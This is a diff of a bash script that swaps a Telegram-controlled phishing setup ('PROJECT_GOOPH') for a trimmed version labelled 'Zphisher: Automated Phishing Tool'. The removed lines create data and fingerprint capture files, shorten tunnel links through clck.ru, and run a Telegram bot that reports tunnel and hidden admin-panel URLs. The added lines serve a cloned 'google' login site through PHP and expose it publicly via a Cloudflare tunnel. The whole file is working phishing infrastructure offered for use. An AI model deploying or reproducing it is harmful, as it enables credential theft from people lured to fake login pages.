@@ -1,246 +1,128 @@
 #!/bin/bash
 
-# Function to display a banner
-display_banner() {
-    clear
-    echo -e "\e[32m"
-    echo -e "========================"
-    echo -e "   PROJECT_GOOPH Setup   "
-    echo -e "========================"
-    echo -e "\e[0m"
+## Zphisher: Automated Phishing Tool
+## Author: TAHMID RAYAT
+## Version: 2.3.5
+## Github: https://github.com/htr-tech/zphisher
+
+__version__="2.3.5"
+HOST='127.0.0.1'
+PORT='8080'
+
+# ANSI colors (FG & BG)
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" RESETBG="$(printf '\e[0m\n')"
+
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
+# Reset terminal colors
+reset_color() {
+    tput sgr0   # reset attributes
+    tput op     # reset color
+    return
 }
 
-# Function to initialize environment
-initialize_environment() {
-    echo -e "\e[32m\n[+] Initializing environment..."
-    setup_directories
+# Kill already running processes
+kill_pid() {
+    check_PID="php cloudflared"
+    for process in ${check_PID}; do
+        if pidof ${process} > /dev/null 2>&1; then # Check for Process
+            killall ${process} > /dev/null 2>&1 # Kill the Process
+        fi
+    done
 }
 
-# Function to create necessary directories
-setup_directories() {
-    echo -e "\n[+] Setting up directories..."
-    mkdir -p .tunnels_log .www .host
-    touch .tunnels_log/port.log
-    touch .tunnels_log/.cloudfl.log
-    touch data.txt fingerprints.txt
-    chmod -R 777 .host .manual_attack .pages .tunnels_log .www data.txt fingerprints.txt
+# Install required packages
+install_dependencies() {
+    echo -e "\n${GREEN}[+]${CYAN} Installing required packages..."
+    pkgs=(php curl unzip)
+    for pkg in "${pkgs[@]}"; do
+        if ! command -v "$pkg" &>/dev/null; then
+            echo -e "${GREEN}[+]${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"
+            if command -v apt > /dev/null 2>&1; then
+                sudo apt install "$pkg" -y
+            elif command -v yum > /dev/null 2>&1; then
+                sudo yum install "$pkg" -y
+            elif command -v pacman > /dev/null 2>&1; then
+                sudo pacman -S "$pkg" --noconfirm
+            else
+                echo -e "${RED}[!] Unsupported package manager, install packages manually."
+                exit 1
+            fi
+        fi
+    done
 }
 
-# Function to start initial scripts
-start_initial_scripts() {
-    echo -e "\e[32m\n[+] Starting initial scripts..."
-    bash packages.sh
-    bash tunnels.sh
+# Download binaries
+download() {
+    url="$1"
+    output="$2"
+    file=$(basename $url)
+    [ -e "$file" ] && rm -rf "$file"
+    curl --silent --fail --retry-connrefused --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+    if [ -e "$file" ]; then
+        mv -f $file .server/$output > /dev/null 2>&1
+        chmod +x .server/$output
+        rm -rf "$file"
+    else
+        echo -e "${RED}[!] Error occurred while downloading ${output}."
+        reset_color
+        exit 1
+    fi
 }
 
-# Function to install necessary packages and libraries
-install_packages_and_libraries() {
-    echo -e "\e[32m\n[+] Installing required packages and libraries..."
-    apt update -y
-    apt install -y python3 python3-venv python3-pip php curl wget unzip
-}
-
-# Function to setup Python virtual environment
-setup_python_env() {
-    echo -e "\n[+] Setting up Python virtual environment..."
-    python3 -m venv venv
-    source venv/bin/activate
-    pip install --upgrade pip
-    pip install telepot requests
-}
-
-# Function to create or update configuration file
-create_or_update_config() {
-    config_file=".www/config.ini"
-    if [[ -f $config_file ]]; then
-        read -p "config.ini already exists. Do you want to update it? (y/n): " choice
-        if [[ $choice != "y" ]]; then
-            echo "Config update skipped."
-            return
+# Install Cloudflared
+install_cloudflared() {
+    if [ -e ".server/cloudflared" ]; then
+        echo -e "\n${GREEN}[+]${GREEN} Cloudflared already installed."
+    else
+        echo -e "\n${GREEN}[+]${CYAN} Installing Cloudflared..."
+        arch=$(uname -m)
+        if [[ "$arch" == *'arm'* || "$arch" == *'Android'* ]]; then
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+        elif [[ "$arch" == *'aarch64'* ]]; then
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+        elif [[ "$arch" == *'x86_64'* ]]; then
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+        else
+            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
         fi
     fi
-
-    read -p "Enter your Telegram bot token: " token
-    read -p "Enter your Telegram chat ID: " chat_id
-
-    cat <<EOL >$config_file
-[telegram]
-token = $token
-chat_id = $chat_id
-EOL
-
-    echo "Config file created/updated successfully."
 }
 
-# Function to start PHP server
-start_php_server() {
-    echo -e "\n[+] Starting PHP server..."
-    RANDOM_PORT=$(( ( RANDOM % 1000 ) + 8000 ))
-    cd .www && php -S 127.0.0.1:$RANDOM_PORT > /dev/null 2>&1 &
-    echo $RANDOM_PORT > ../.tunnels_log/port.log
-    cd ..
+# Setup website and start PHP server
+setup_site() {
+    echo -e "\n${RED}[-]${BLUE} Setting up server..."
+    mkdir -p .www
+    if [ ! -d ".sites/$website" ]; then
+        echo -e "${RED}[!] Error: The directory '.sites/$website' does not exist."
+        reset_color
+        exit 1
+    fi
+    cp -rf .sites/"$website"/* .www
+    echo -e "${RED}[-]${BLUE} Starting PHP server..."
+    php -S "$HOST":"$PORT" -t .www > /dev/null 2>&1 &
 }
-# Function to start Cloudflared tunnel and shorten URL
+
+# Start Cloudflared
 start_cloudflared() {
-    echo -e "\n[+] Starting Cloudflared tunnel..."
-    RANDOM_PORT=$(cat .tunnels_log/port.log)
-    if [[ $(command -v termux-chroot) ]]; then
-        termux-chroot ./.host/cloudflared tunnel -url http://127.0.0.1:$RANDOM_PORT > .tunnels_log/.cloudfl.log 2>&1 &
-    else
-        ./.host/cloudflared tunnel -url http://127.0.0.1:$RANDOM_PORT > .tunnels_log/.cloudfl.log 2>&1 &
-    fi
-
-    sleep 15  # Adjust sleep time as needed, depending on how long it takes for Cloudflared to start
-
-    # Debugging: Print the contents of .cloudfl.log to see what's happening
-    echo -e "\nContents of .cloudfl.log:"
-    cat .tunnels_log/.cloudfl.log
-
-    # Check if Cloudflared URL is found in the log file
-    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
-    if [[ -z $cldflr_url ]]; then
-        echo "Error: Cloudflared URL not found."
-        exit 1
-    fi
-
-    shortened_url=$(curl -s http://clck.ru/--?url=${cldflr_url})
-
-    echo -e "\nCloudflared URL: ${cldflr_url}"
-    echo -e "\nShortened URL: ${shortened_url}"
-
-    if [[ -f .www/config.ini ]]; then
-        TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
-        TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
-        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" -d "text=Cloudflared URL: ${cldflr_url}\nShortened URL: ${shortened_url}&chat_id=${TELEGRAM_CHAT_ID}" > /dev/null
-    else
-        echo "config.ini not found in .www folder. Cannot send URL to Telegram."
-    fi
+    mkdir -p .server
+    setup_site
+    echo -e "${RED}[-]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+    sleep 2
+    ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+    sleep 8
+    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+    echo -e "\n${RED}[-]${BLUE} URL: ${GREEN}$cldflr_url"
 }
 
-
-# Function to setup and run Telegram bot
-setup_telegram_bot() {
-    config_file=".www/config.ini"
-    if [[ ! -f $config_file ]]; then
-        echo "config.ini not found. Please run the setup again."
-        exit 1
-    fi
-
-    TELEGRAM_TOKEN=$(grep 'token' $config_file | cut -d '=' -f 2 | xargs)
-    TELEGRAM_CHAT_ID=$(grep 'chat_id' $config_file | cut -d '=' -f 2 | xargs)
-
-    # Write Python script for Telegram bot
-    cat > cloudflare_manager_bot.py <<EOF
-import sys
-import time
-import telepot
-import requests
-import subprocess
-import re
-from telepot.loop import MessageLoop
-from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton
-
-TELEGRAM_TOKEN = '${TELEGRAM_TOKEN}'
-bot = telepot.Bot(TELEGRAM_TOKEN)
-tunnel_process = None
-
-def handle(msg):
-    content_type, chat_type, chat_id = telepot.glance(msg)
-    if content_type == 'text':
-        command = msg['text']
-        if command == '/start':
-            bot.sendMessage(chat_id, 'Welcome to the Cloudflare Manager Bot! Press a button:', reply_markup=ReplyKeyboardMarkup(
-                keyboard=[
-                    [KeyboardButton(text='Start Tunnel'), KeyboardButton(text='Stop Tunnel')],
-                    [KeyboardButton(text='Get Tunnel URL'), KeyboardButton(text='Admin Access')],
-                    [KeyboardButton(text='Update Bot')]
-                ]
-            ))
-        elif command == 'Start Tunnel':
-            start_tunnel(chat_id)
-        elif command == 'Stop Tunnel':
-            stop_tunnel(chat_id)
-        elif command == 'Get Tunnel URL':
-            get_tunnel_url(chat_id)
-        elif command == 'Admin Access':
-            admin_access(chat_id)
-        elif command == 'Update Bot':
-            update_bot(chat_id)
-
-def start_tunnel(chat_id):
-    global tunnel_process
-    bot.sendMessage(chat_id, "Starting Cloudflared tunnel...")
-    tunnel_process = subprocess.Popen(['./start.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    time.sleep(10)
-    bot.sendMessage(chat_id, "Tunnel started.")
-
-def stop_tunnel(chat_id):
-    global tunnel_process
-    if tunnel_process:
-        subprocess.Popen(['./stop.sh'])
-        tunnel_process.terminate()
-        bot.sendMessage(chat_id, "Tunnel stopped.")
-    else:
-        bot.sendMessage(chat_id, "No tunnel running.")
-
-def get_tunnel_url(chat_id):
-    try:
-        with open('.tunnels_log/.cloudfl.log', 'r') as log_file:
-            log_contents = log_file.read()
-        cldflr_url = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents).group(0)
-        shortened_url = requests.get(f"http://clck.ru/--?url={cldflr_url}").text
-        bot.sendMessage(chat_id, f"Cloudflared URL: {cldflr_url}\nShortened URL: {shortened_url}")
-    except Exception as e:
-        bot.sendMessage(chat_id, f"Error retrieving URL: {e}")
-
-def admin_access(chat_id):
-    try:
-        with open('.tunnels_log/.cloudfl.log', 'r') as log_file:
-            log_contents = log_file.read()
-        cldflr_url = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents).group(0)
-        admin_url = f"{cldflr_url}/q/w/e/r/t/y/u/i/o/p/login.php"
-        shortened_admin_url = requests.get(f"http://clck.ru/--?url={admin_url}").text
-        bot.sendMessage(chat_id, f"Admin Panel URL: {shortened_admin_url}")
-    except Exception as e:
-        bot.sendMessage(chat_id, f"Error generating admin URL: {e}")
-
-def update_bot(chat_id):
-    bot.sendMessage(chat_id, "Updating bot... (Functionality under construction)")
-
-def send_greeting_and_menu():
-    bot.sendMessage(${TELEGRAM_CHAT_ID}, 'Welcome to the Cloudflare Manager Bot! Press a button:', reply_markup=ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text='Start Tunnel'), KeyboardButton(text='Stop Tunnel')],
-            [KeyboardButton(text='Get Tunnel URL'), KeyboardButton(text='Admin Access')],
-            [KeyboardButton(text='Update Bot')]
-        ]
-    ))
-
-bot = telepot.Bot(TELEGRAM_TOKEN)
-send_greeting_and_menu()
-MessageLoop(bot, handle).run_as_thread()
-print('Bot is listening...')
-
-while True:
-    time.sleep(10)
-EOF
-
-    # Run the Python script for the bot
-    echo -e "\n[+] Running the Telegram bot..."
-    source venv/bin/activate
-    python3 cloudflare_manager_bot.py &
+# Main
+main() {
+    kill_pid
+    install_dependencies
+    install_cloudflared
+    website="google"  # You can change the default website here
+    start_cloudflared
 }
 
-# Main script execution
-setup_directories
-display_banner
-initialize_environment
-start_initial_scripts
-install_packages_and_libraries
-setup_python_env
-create_or_update_config
-start_php_server
-start_cloudflared
-setup_telegram_bot
-
-echo -e "\n[+] Setup complete. The Cloudflare Manager Bot is now running."
+main
